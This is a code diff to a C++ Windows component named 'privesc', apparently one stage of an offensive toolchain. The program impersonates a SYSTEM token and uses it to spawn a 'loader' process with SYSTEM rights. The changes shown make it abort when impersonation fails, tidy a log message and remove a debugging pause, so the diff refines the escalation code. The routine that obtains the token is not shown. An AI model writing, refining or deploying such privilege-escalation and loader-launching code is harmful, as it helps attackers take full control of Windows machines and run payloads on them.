@@ -4,7 +4,7 @@ std::string componentName = "privesc";
 
 int wmain() {
 	Log("[+] Starting " + componentName + ".", componentName);
-	Log("[*] Running as " + UserRunningProcess(), componentName);
+	Log("[*] Running as " + RunWhoami(), componentName);
 	Log("[+] Beginning token impersonation.", componentName);
 
 	HANDLE hDuplicateToken = NULL;
@@ -13,6 +13,7 @@ int wmain() {
 	int err = SystemToken(&hDuplicateToken);
 	if (err != 0) {
 		Log("[!] System token impersonation failed with error " + err, componentName);
+		return 1;
 	}
 
 	STARTUPINFOW si;
@@ -34,15 +35,11 @@ int wmain() {
 		&si,
 		&pi
 	)) {
-		Log("[!] Spawning loader as system failed" + std::to_string(GetLastError()), componentName);
+		Log("[!] Spawning loader as system failed: " + std::to_string(GetLastError()), componentName);
 	}
 	else {
 		Log("[+] Successfully spawned loader", componentName);
 	}
-
-	// keep window open for testing
-	int x;
-	std::cin >> x;
 
 	return 0;
 }
